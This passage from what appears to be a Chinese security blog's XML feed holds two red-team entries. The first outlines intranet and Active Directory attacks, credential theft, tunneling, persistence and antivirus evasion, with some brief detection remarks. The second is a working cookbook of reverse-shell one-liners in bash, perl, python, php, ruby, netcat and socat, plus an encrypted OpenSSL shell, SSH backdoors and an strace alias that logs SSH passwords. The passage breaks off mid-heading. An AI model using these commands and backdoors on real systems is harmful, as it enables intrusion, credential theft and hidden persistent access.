]<br>获取本机 rdp / ssh 端口开启状态 及 其默认端口号<br>获取本机所有用户的rdp外连记录<br>获取本机的所有SSH登录记录<br>获取当前系统所有登录成功的日志 [ 针对windows ]<br>获取本机所有已安装软件的详细列表 [ 主要为抓密码,提权,留后门做准备 ]<br>获取本机各个浏览器中保存的 所有书签页 及 历史浏览记录<br>获取当前用户创建的所有计划任务列表 及 计划任务所对应的执行脚本内容 [ 有些执行脚本中很可能存的有各种连接账号密码 ]<br>获取当前用户 桌面 及 回收站 里的所有文件列表<br>获取当前系统的所有存在suid权限的二进制程序<br>获取当前系统代理 [ ip &amp; 端口 ]<br>获取当前系统所有的自启动注册表项值<br>获取当前系统的所有 ipc 连接 及 已启用共享<br>获取当前系统的所有挂载[mount]<br>获取当前系统的防火墙状态<br>获取当前系统所有分区/盘符及其详细使用情况<br>获取本机的累计开机时长<br>获取本机arp / dns缓存<br>获取当前机器环境变量 [ 主要想看看目标机器上有无python,jdk,ruby…等语言的执行环境,后期可设法利用 ]<br>获取当前系统所有本地用户及组列表<br>获取当前系统host文件内容<br>获取当前机器硬件设备信息[ 主要为判断当前机器是否为虚拟机 ]<br>远程截屏捕捉目标用户敏感操作</p><p>由于上述大部分的搜集动作都是基于系统内置工具和接口,故,可完全依靠EDR来实时捕捉各类敏感进程上报恶意操作</p><pre><code>* 利用当前已控 &quot;跳板机&quot;, 分析目标内网大致网络拓扑 及 所有关键性业务机器分布 * 批量抓取内网所有windows机器名 和 所在 &quot;域&quot; / &quot;工作组名&quot; [smb探测扫描]* 针对内网的各种高危敏感服务定位[&quot;安全&quot; 端口扫描 (在避免对方防护报警拦截的情况下进行各种常规服务探测识别)]* 内网批量 Web Banner 抓取,获取关键目标业务系统如下</code></pre><p>内网各种文件[共享]服务器<br>内网各类web服务器  [ 可用于后期留入口 ]<br>内网各类数据库服务器<br>内网邮件服务器  [ 可用于后期留入口 ]<br>内网Vpn服务器  [ 可用于后期留入口 ]<br>内网各类常规资产状态监控服务器,eg: zabbix,nagios,cacti…<br>内网各类防护的主控端,比如,防火墙,EDR,态势感知 产品的web主控端…<br>内网日志服务器<br>内网补丁服务器<br>内网各类OA,ERP,CRM,SRM,HR系统…<br>内网打印服务器<br>内网 MES 系统<br>内网虚拟化服务器 / 超融合平台 [Vmware ESX]<br>内网堡垒机…<br>内网运维,研发 部门员工的机器<br>内网路由,交换设备…<br>等等等…</p><p>针对以上的各种常规内网探测扫描,其实在流量上都会有非常清晰的表现<br>通过在一些关键节点设备/服务器上部署探针搜集流量<br>再配合大数据关联分析查找各种敏感特征,理论上是相对容易发现各类扫描探测痕迹的</p><pre><code>* 针对各类已知系统高危RCE漏洞的批量探测识别与利用</code></pre><p>MS08-067 [ 其实,某些特殊行业的系统可能非常老,极少更新,故,还是有存在的可能 ]<br>MS17-010<br>CVE-2019-0708</p><p>其实针对此类漏洞的攻击利用识别,就显得比较直白了<br>通过深入分析每种漏洞在实际攻击利用过程所产生的一些典型 流量特征 和 系统日志即可大致判断</p><pre><code>### 0x07 内网安全  [ 各类敏感凭证 &quot;搜集&quot; 与 &quot;窃取&quot; ]* 主动密码搜集 </code></pre><p>注:如下某些操作肯定是需要事先自己想办法先拿到管理权限或者在指定用户权限下才能正常进行的<br>此处不再赘述, 此项非防御重点, 因为压根也不好防</p><p>批量抓取当前机器上的 “各类基础服务配置文件中保存的各种账号密码”<br>   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic…)…<br>想办法 “控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表”<br>   比如, <em>.ls,</em>.doc,*.docx, *.txt….<br>抓取各类 “数据库客户端工具中保存各种数据库连接账号密码<br>   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]</p><p>抓取当前系统 “注册表中保存的各类账号密码hash” [ Windows ]<br>抓取当前系统所有 “本地用户的明文密码/hash” [ Windows &amp; linux ]<br>抓取当前系统的所有 “用户token” [ Windows ]<br>抓取 “windows凭据管理器中保存的各类连接账号密码”<br>抓取 “MSTSC 客户端中保存的所有rdp连接账号密码”<br>抓取各类 “VNC客户端工具中保存的连接密码”<br>抓取 “GPP目录下保存的各类账号密码” [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]<br>抓取各类 “SSH客户端工具中保存的各种linux系统连接账号密码”, SecureCRT,Xshell,WinSCP,putty<br>抓取各类 “浏览器中保存的各种web登录密码”,Chrome [360浏览器],Firefox,IE,QQ浏览器<br>抓取各类 “数据库表中保存的各类账号密码hash”<br>抓取各类 “FTP客户端工具中保存的各种ftp登录账号密码”, filezila, xftp…<br>抓取各类 “邮件客户端工具中保存的各种邮箱账号密码”, forxmail, thunderbird…<br>抓取各类 “SVN客户端工具中保存的所有连接账号密码及项目地址”<br>抓取各类 “VPN客户端工具中保存的各种vpn链接账号密码”</p><pre><code>* 被动密码搜集 [ 等着管理员自己来送密码 ] </code></pre><p>[注: 某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的, 此处不再赘述 , 是防御重点]</p><p>Windows SSP [持久化/内存]<br>Hook PasswordChangeNotify [持久化/内存]<br>OWA 登录账号密码截获<br>截获mstsc.exe中输入的rdp连接账号密码<br>linux 别名记录利用<br>本机明文密码嗅探 [ http,ftp,pop3… ]<br>传统键盘记录<br>windows蓝屏技巧 [ 此操作主要为应对不时之需,比如,搞蓝屏,登管理员登录抓密码 ]</p><pre><code>* Hash爆破:</code></pre><p>Hashcat [ 完全拼GPU ] </p><pre><code>### 0x08 内网安全 [ 内网常用 &quot;隧道&quot;&quot; / &quot;转发&quot;&quot; / &quot;代理&quot;&quot; 穿透手法 提炼汇总 ，防御重点 ]</code></pre><p>出网流量刺探<br>比如,http,dns,以及一些穿透性相对较好的tcp端口…<br>这种操作一般都会配合wmi,smb,ssh远程执行,在内网批量快速识别出能出网的机器</p><p>常规 HTTP脚本代理<br>abptts,Neo-reGeorg,reGeorg,tunna,reduh…<br>不得不说,公开脚本在实战中多多少少都会有些问题,还需要根据自己的实际目标环境深度改进才行</p><p>SSH 隧道<br>加密端口转发,socks 实战用途非常灵活,此处不细说 ]</p><p>Rdp 隧道</p><p>反向SOCKS<br>nps, frp, ssf, CobaltStrike(socks4a &amp; rportfwd ), sscoks …<br>工具基本都不免杀了,需要自行处理</p><p>正反向TCP 端口转发<br>非常多,就不一一列举, eg: nginx,netsh,socat,ew….</p><p>DNS加密隧道            </p><p>Web端口复用</p><p>需要明白的是,在一般的红队场景中<br>入侵者为了尽可能躲避各种检测设备的流量解析,很多此类工具都会采用各种各样的方式来加密传输流量,以此来保证自己有更强的穿透性</p><pre><code>### 0x09 域内网安全 [ 域内常用攻击手法 ( 域渗透 )，提炼汇总，防御重点 ]* 针对当前域的一些常规信息搜集[ 其实现实中,只需要一个BloodHound &amp; Pingcastle足矣,就是工具需要自行事先免杀好]</code></pre><p>获取当前域内的完整域管列表<br>获取当前域内的所有域控机器名列表<br>获取当前域内的所有DNS服务器机器名列表<br>获取当前域内的所有SPN<br>获取当前域内的所有OU<br>获取当前域内的所有用户 &amp; 用户组列表<br>获取当前域信任关系 [ 跨域渗透 ]<br>获取当前域内所有机器的开机时间<br>获取当前域内网段及web站点<br>获取当前域内策略 [ 主要是为了了解密码策略 ]<br>获取当前域林<br>…….</p><pre><code>* 快速获取目标域控权限的一些常规手法</code></pre><p>搜集GPP 目录 [ 其中可能保存的有域账号密码,不仅仅是存在XML里的那些,NETLOGON目录中的某些脚本同样也可能保存有账号密码 ]<br>服务票据hash破解(“尤其是域管用户的”) [ kerberoast ]<br>批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]<br>Kerberos 委派利用<br>爆破LDAP<br>Exchange特定ACL滥用<br>SSP 截获关键服务器登录密码<br>利用各类基础服务在内网快速 getshell [ 弱口令, 各类JAVA中间件已知Nday漏洞, 常规Web漏洞… ],在内网循环抓各类密码,直至<br>  抓到域管密码<br>  抓到域管令牌<br>DNSAdmin 组成员滥用 [ 加载执行恶意dll ]<br>LAPS<br>MS14-068 [ 如今实际中已很少遇到了 ]<br>LLMNR/NBNS欺骗  + SMB relay [ 真实在实战中其实用的并不多 ]</p><pre><code>* 域内后渗透敏感信息搜集分析</code></pre><p>获取所有DNS记录<br>导出当前域的完整LDAP数据库<br>提取当前域的ntds.dit [ 域内账号密码数据库 ]<br>  Dcsync同步<br>  Volume Shadow Copy Service</p><pre><code>* 域内指定用户登录ip定位</code></pre><p>利用OWA登录日志<br>利用域控服务器登录日志<br>指定服务银票 [ Silver Ticket ]<br>除此之外,就是下面的各类常规横向手法</p><pre><code>* 域内指定用户机器定向控制技巧</code></pre><p>绑定用户登录脚本<br>利用GPO下发 [实际上,利用GPO能做的事情还非常非常多]<br>PTT [ 票据传递 ]</p><pre><code>* 针对域管的各种权限维持技巧</code></pre><p>金票<br>Skeleton Key<br>DSRM密码同步<br>OWA后门<br>…</p><pre><code>* 域内Exchange 邮件数据脱取</code></pre><p>利用Ews接口通过PTH的方式脱邮件</p><pre><code>### 0x10 内网安全 [ 跨平台横向渗透 (远程执行)，防御重点 ( &quot;重中之重&quot; ) ]* 从 Windows平台 横向至  Windows平台</code></pre><p>注: 以下某些远程执行方式, 即可直接用明文账号密码 亦可 基于pth来进行, 不局限</p><p>远程服务管理 [ SCM ]<br>远程创建执行计划任务 [ Scheduled Tasks ]<br>WMI 远程执行 [ WMI ]<br>针对高版本Windows 的WinRM 远程执行<br>DCOM 远程执行 [ 需要目标Windows机器事先已关闭防火墙 ]<br>高版本 RDP 远程执行<br>利用MSSQL数据库存储过程来变相远程执行<br>利用Oracle数据库存储过程来变相远程执行<br>SMB [ PTH (hash传递) ]<br>RDP[MSTSC] 反向渗透 [ 即可用于突破某些隔离, 亦可通过云(Windows vps)直接反控目标管理员个人机 CVE-2019-0887 ]<br>利用补丁服务器下发执行<br>利用EDR主控端定向下发执行</p><pre><code>* 从 Windows平台 横向至 *inux平台</code></pre><p>plink 或者 基于Windows SSH库自行开发各种远程执行小工具</p><pre><code>* 从 *inux平台 横向至 Windows 平台</code></pre><p>一般都会将 impacket套件中的各个常用py脚本事先直接打包成可执行文件, 然后丢到目标linux系统中去执行,如下<br>wmiexec_linux_x86_64<br>smbexec_linux_x86_64<br>psexec_linux_x86_64<br>atexec_linux_x86_64<br>dcomexec_linux_x86_64</p><p>另外,还有一些基于go的工具,同样也可以编译成可执行文件之后再丢上去执行</p><pre><code>* 从 *inux平台 横向至 *inux 平台</code></pre><p>linux 自带的ssh客户端工具套件, 默认就可以用来进行远程执行</p><pre><code>* 各种远程下载技巧</code></pre><p>wget [ win &amp; linux ]<br>curl [ win &amp; linux ]</p><pre><code></code></pre><p>之所以没着重提以下这些系统内置的远程下载执行工具,主要还是因为事先已经明确知道<br>某些杀软环境下它肯定会被拦截,所以事先就直接把它弃用了,尤其针对红队这种场景,这些东西根本不在乎多,有一个能用好用的即可</p><p>CertUtil.exe<br>Bitsadmin.exe<br>Regsvr32.exe<br>Rundll32.exe<br>Powershell.exe<br>……</p><pre><code>### 0x11 内网安全 [ 权限维持，防御重点 ] [ 注: 有些细节此处并未展开详细说明 ]* 边界入口权限维持</code></pre><p>OWA 登录口 [ 账号密码,webshell ]<br>VPN 登录口 [ 账号密码,shell ]<br>其他 MAIL 登录口 [ 账号密码 ]<br>边界 Web服务器 [ Webshell 驻留技巧 ]<br>边界路由交换设备 [ 账号密码,shell ]<br>…</p><pre><code>* Windows 单机系统维持 [临时]</code></pre><p>系统计划任务 [ 高权限/低权限 ]<br>常规注册表自启动项 [ 用户权限/system权限 ]<br>Mssql存储过程 [ 继承服务权限 ]<br>WMI<br>Winlogon<br>CLR<br>Logon Scripts<br>MruPidlList<br>Mof<br>传统远控<br>…</p><pre><code>* linux 单机系统维持 [临时]</code></pre><p>Patch SSH<br>替换各类基础服务so [ PAM,Nginx,Rsync …]<br>系统计划任务<br>传统应用层远控<br>驱动层远控( 针对特定内核版本 )</p><pre><code>### 0x12 痕迹处理</code></pre><p>web日志 [ 访问, 错误日志 ]<br>数据库日志 [ 异常连接日志,慢查询日志 ]<br>系统各类安全日志 [ ssh,rdp,smb,wmi,powershell….]<br>各类邮箱登录日志<br>域内敏感攻击利用日志 [ 金票,银票… ]<br>此项为专业蓝队范畴,不再赘述<br>……</p><pre><code>### 0x13 各类常用 C2 / 渗透 框架</code></pre><p>CobaltStrike [二次开发]<br>  payload(beacon) 逆向/改进重写<br>Metasploit [二次开发]<br>……</p><pre><code>### 0x14 各类常用 Webshell管理工具</code></pre><p>菜刀    caidao20160622<br>冰蟹    Behinder_v2.0.1<br>蚁剑    AntSword<br>……</p><pre><code>### 0x15 免杀 及 各类防火墙对抗* 静态</code></pre><p>混淆:<br>手工混淆,有源码的情况下,尝试逐个替换可能是关键特征字符串的 命名空间名, 函数名, 变量名, 字符串 等等等….<br>工具混淆,针对各种语言的专业混淆工具 [ 有商业版 ]<br>…</p><p>加壳:<br>一些常用公开壳的实际效果可能并不是太好 [ 也有商业壳 ]<br>最好的方式还是尝试自己写壳,就是成本较高<br>…</p><pre><code>* 动态</code></pre><p>反射<br>shellcode 内存加解密执行 ( 对于现在的某些杀软来讲,可能并没什么卵用,别人拦的基本都是你的最终调用 )<br>白利用<br>……</p><p>注:<br>   理论上, 这些应该也没有什么非常通用的方法<br>   大多还是事先针对特定的杀软针对性的不停调试分析出它到底怎么拦,怎么查的,然后再针对性的对症下药</p><pre><code>* 流量:</code></pre><p>域前置[利用大厂cdn]<br>DNS加密隧道<br>第三方公共邮箱上线<br>第三方网盘上线<br>第三方社交网站上线<br>第三方匿名社交工具上线[eg: tg机器人,tor…]</p><pre><code>##### 更多高质量精品实用干货分享,欢迎( 注: 乱七八杂的娱乐人员请不要来,来时请严格注明来意,否则一律不予通过,谢谢,期待认真做技术的你 )&lt;img src=&quot;ak.jpg&quot; /&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 红队 </category>
          
          <category> 内网 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>权限维持方法</title>
      <link href="/2020/073020432.html"/>
      <url>/2020/073020432.html</url>
      
        <content type="html"><![CDATA[<h2 id="0X01-获得初始权限"><a href="#0X01-获得初始权限" class="headerlink" title="0X01 获得初始权限"></a>0X01 获得初始权限</h2><p>Linux有很多种反弹shell的方法,反弹shell的好处主要是操作过程中会更加方便,对我个人来说,主要是命令补全,总之,从权限维持的角度来说,可以更好的去执行一些操作.</p><p>能否反弹shell,要根据目标的环境来尝试,有可能bash无法直接反弹,但是python却可以成功,还要注意白名单问题.</p><p>实验环境准备直接用Kali,记得做好快照.</p><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p>bash</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/10.0.0.1/8080 0<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre><p>bash</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i 5<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/host/port 0<span class="token operator">></span><span class="token operator">&amp;</span>5 1<span class="token operator">></span><span class="token operator">&amp;</span>5</code></pre><p>参考资料:<br>bash反弹shell原理解析<br>[<a href="https://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/]" target="_blank" rel="noopener">https://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/]</a>(<a href="https://www.00theway.org/2017/07/11/bash" target="_blank" rel="noopener">https://www.00theway.org/2017/07/11/bash</a> 反弹shell/)</p><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><p>bash</p><pre class=" language-bash"><code class="language-bash">perl -e <span class="token string">'use Socket;<span class="token variable">$i</span>="10.0.0.1";<span class="token variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(<span class="token variable">$p</span>,inet_aton(<span class="token variable">$i</span>)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};'</span></code></pre><h3 id="URL-Encoded-Perl-Linux"><a href="#URL-Encoded-Perl-Linux" class="headerlink" title="URL-Encoded Perl: Linux"></a>URL-Encoded Perl: Linux</h3><p>bash</p><pre class=" language-bash"><code class="language-bash">echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew</code></pre><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>bash</p><pre class=" language-bash"><code class="language-bash">php -r <span class="token string">'<span class="token variable">$sock</span>=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span></code></pre><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><p>bash</p><pre class=" language-bash"><code class="language-bash">ruby -rsocket -e<span class="token string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span></code></pre><h3 id="Netcat-without-e-1"><a href="#Netcat-without-e-1" class="headerlink" title="Netcat without -e #1"></a>Netcat without -e #1</h3><p>mkfifo函数只是创建一个FIFO文件，要使用命名管道将其打开。</p><p>bash</p><pre class=" language-bash"><code class="language-bash"><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">cat</span> /tmp/f <span class="token operator">|</span> /bin/sh -i 2<span class="token operator">></span><span class="token operator">&amp;</span>1 <span class="token operator">|</span> nc 10.0.0.1 1234 <span class="token operator">></span> /tmp/f</code></pre><h3 id="Netcat-without-e-2"><a href="#Netcat-without-e-2" class="headerlink" title="Netcat without -e #2"></a>Netcat without -e #2</h3><p>bash</p><pre class=" language-bash"><code class="language-bash">nc localhost 443 <span class="token operator">|</span> /bin/sh <span class="token operator">|</span> nc localhost 444telnet localhost 443 <span class="token operator">|</span> /bin/sh <span class="token operator">|</span> telnet localhost 444</code></pre><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>bash</p><pre class=" language-bash"><code class="language-bash">r <span class="token operator">=</span> Runtime.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> p <span class="token operator">=</span> r.exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"exec 5&lt;>/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \<span class="token variable">$line</span> 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> p.waitFor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="Xterm"><a href="#Xterm" class="headerlink" title="Xterm"></a>Xterm</h3><p>c</p><pre class=" language-c"><code class="language-c">xterm <span class="token operator">-</span>display <span class="token number">10.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">1</span></code></pre><h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h3><p>bash</p><pre class=" language-bash"><code class="language-bash">0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>196<span class="token punctuation">;</span><span class="token function">exec</span> 196<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/<span class="token operator">&lt;</span>your_vps<span class="token operator">></span>/1024<span class="token punctuation">;</span> sh <span class="token operator">&lt;</span><span class="token operator">&amp;</span>196 <span class="token operator">></span><span class="token operator">&amp;</span>196 2<span class="token operator">></span><span class="token operator">&amp;</span>196</code></pre><p>思考:假设渗透过程中,发现目标环境无法反弹shell,最后测试得出只开放了80和443.通过白名单反弹shell时又发现流量被拦截了,如何应对这种情况?</p><p>可以尝试通过加密数据包的方式来逃避流量监控设备.</p><p>第一步:<br>在VPS 上生成 SSL 证书的公钥/私钥对：</p><p>bash</p><pre class=" language-bash"><code class="language-bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre><p>第二步:<br>VPS 监听反弹 shell：</p><p>bash</p><pre class=" language-bash"><code class="language-bash">openssl s_server -quiet  -key key.pem -cert cert.pem -port 443</code></pre><p>第三步:<br>连接:</p><p>bash</p><pre class=" language-bash"><code class="language-bash"><span class="token function">mkfifo</span> /tmp/wing<span class="token punctuation">;</span>/bin/bash -i <span class="token operator">&lt;</span> /tmp/wing 2<span class="token operator">></span><span class="token operator">&amp;</span>1 <span class="token operator">|</span>openssl s_client -quiet -connect 1.1.1.1:443 <span class="token operator">></span> /tmp/wing</code></pre><p>获得shell</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ubmxhcmsuY29tL3l1cXVlLzAvMjAxOS9wbmcvMzcwOTE5LzE1Njc3MDM3Njk1OTQtNWQ1YWFmMDItZGUyZS00YmM2LTk2YzgtMWVkYTRkNTA4MWI5LnBuZw?x-oss-process=image/format,png#align=left&display=inline&height=138&name=image.png&originHeight=276&originWidth=1252&size=50680&status=done&width=626" alt="image.png"></p><p><strong>image.png</strong></p><p>但这时你会发现,这个shell不太好用,没有基本的命令补全.</p><p>解决方法:</p><p>bash</p><pre class=" language-bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span></code></pre><p>pty是一个伪终端模块</p><p>bash</p><pre class=" language-bash"><code class="language-bash">pty.spawn<span class="token punctuation">(</span>argv<span class="token punctuation">[</span>, master_read<span class="token punctuation">[</span>, stdin_read<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>产生一个进程，并将其控制终端与当前进程的标准io连接。这通常用于阻挡坚持从控制终端读取的程序。函数 master_read 和 stdin_read 应该是从文件描述符读取的函数。默认值尝试在每次调用时读取1024字节。在 3.4 版更改: spawn<span class="token punctuation">(</span><span class="token punctuation">)</span> 现在从子进程的 os.waitpid<span class="token punctuation">(</span><span class="token punctuation">)</span> 返回状态值</code></pre><p>有时候提权以后终端也是会出现类似问题,一般这个方法可以解决.</p><p>或者参考后面的链接</p><h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><p>bash</p><pre class=" language-bash"><code class="language-bash">socat file:<span class="token variable"><span class="token variable">`</span><span class="token function">tty</span><span class="token variable">`</span></span>,raw,echo<span class="token operator">=</span>0 tcp-listen:9999把socat上传到目标机器上，然后执行：socat exec:<span class="token string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:111.111.111.111:9999</code></pre><p>也可以得到一个交互式shell</p><p>知识点来源于</p><p>将简单的shell升级为完全交互式的TTY<br><a href="https://www.4hou.com/technology/6248.html" target="_blank" rel="noopener">https://www.4hou.com/technology/6248.html</a></p><p>全程带阻：记一次授权网络攻防演练（下）<br><a href="https://www.freebuf.com/vuls/211847.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/211847.html</a></p><h2 id="0X02-权限维持技术"><a href="#0X02-权限维持技术" class="headerlink" title="0X02 权限维持技术"></a>0X02 权限维持技术</h2><h2 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h2><h3 id="SSH软连接"><a href="#SSH软连接" class="headerlink" title="SSH软连接"></a>SSH软连接</h3><p>bash</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ln</span> -sf /usr/sbin/sshd /tmp/su<span class="token punctuation">;</span> /tmp/su -oPort<span class="token operator">=</span>5555<span class="token punctuation">;</span></code></pre><p>建立一个软连接，然后通过5555端口访问ssh服务</p><p>正常的登陆功能</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODEwNjA3MTc1NjIuanBn?x-oss-process=image/format,png" alt="-w1024"></p><p><strong>-w1024</strong></p><p>添加用户</p><p>bash</p><pre class=" language-bash"><code class="language-bash"><span class="token function">useradd</span> wing -p wing</code></pre><p>ssh连接时密码任意输入，kali测试时，root也可以。</p><p>具体原理见<a href="http://www.91ri.org/16803.html" target="_blank" rel="noopener">Linux的一个后门引发对PAM的探究</a></p><h3 id="SSH-Wrapper"><a href="#SSH-Wrapper" class="headerlink" title="SSH Wrapper"></a>SSH Wrapper</h3><p>Exploit:</p><p>bash</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/sbin/<span class="token function">mv</span> sshd <span class="token punctuation">..</span>/bin/<span class="token keyword">echo</span> <span class="token string">'#!/usr/bin/perl'</span> <span class="token operator">></span>sshd<span class="token keyword">echo</span> <span class="token string">'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);'</span> <span class="token operator">>></span>sshd<span class="token keyword">echo</span> <span class="token string">'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,'</span> <span class="token operator">>></span>sshd<span class="token function">chmod</span> u+x sshd/etc/init.d/sshd restart</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODE4MDkwMjEzNDEuanBn?x-oss-process=image/format,png" alt="-w653"></p><p><strong>-w653</strong></p><p>然后连接：</p><p>bash</p><pre class=" language-bash"><code class="language-bash">socat STDIO TCP4:target_ip:22,sourceport<span class="token operator">=</span>13377</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODE4MDg3NjUxMDUuanBn?x-oss-process=image/format,png" alt="-w951"></p><p><strong>-w951</strong></p><p>原理：</p><blockquote><p>init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。<br>来自<a href="https://www.anquanke.com/post/id/155943#h2-9" target="_blank" rel="noopener">https://www.anquanke.com/post/id/155943#h2-9</a></p></blockquote><h3 id="SSH-key的写入"><a href="#SSH-key的写入" class="headerlink" title="SSH key的写入"></a>SSH key的写入</h3><p>本地先生成ssh key</p><p>bash</p><pre class=" language-bash"><code class="language-bash">ssh-keygen -t rsa</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODEzNTU1Nzc4MDIuanBn?x-oss-process=image/format,png" alt="-w729"></p><p><strong>-w729</strong></p><p>再把公钥id_rsa.pub发送到目标上</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODEzNTU5OTUxNDYuanBn?x-oss-process=image/format,png" alt="-w1002"></p><p><strong>-w1002</strong></p><p>同时赋予权限，但是权限不能过大。</p><p>bash</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> 600 ~/.ssh/authorized_keys<span class="token function">chmod</span> 700 ~/.ssh</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODEzNTY2NzYwOTguanBn?x-oss-process=image/format,png" alt="-w882"></p><p><strong>-w882</strong></p><h3 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h3><p>在当前用户配置文件末尾添加</p><pre><code>alias ssh=&#39;strace -o /tmp/sshpwd-`date    &#39;+%d%h%m%s&#39;`.log -e read,write,connect  -s2048 ssh&#39;</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODE4MTQyMzA4MDUuanBn?x-oss-process=image/format,png" alt="-w651"></p><p><strong>-w651</strong></p><h3 id="Openssh-Rookit"><a 